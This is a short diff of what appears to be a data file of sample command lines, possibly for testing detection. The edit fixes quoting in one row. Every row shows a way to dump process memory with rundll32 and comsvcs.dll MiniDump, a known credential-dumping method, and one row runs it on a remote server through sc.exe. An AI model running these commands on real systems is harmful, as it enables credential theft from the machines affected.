@@ -1,5 +1,5 @@
 ﻿command_line
-"""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump <PID> \Windows\Temp\<filename>.dmp full"
+"C:\Windows\System32\rundll32.exe"  C:\Windows\System32\comsvcs.dll MiniDump <PID> \Windows\Temp\<filename>.dmp full"
 ".\rundll32.exe  C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Administrator\<filename>.dmp full   "
 """C:\Windows\system32\sc.exe"" \\server create Dump binpath= ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <PID> C:\dump.bin full"""
 """C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -c rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Users\username\Desktop\<filename>.DMP full"
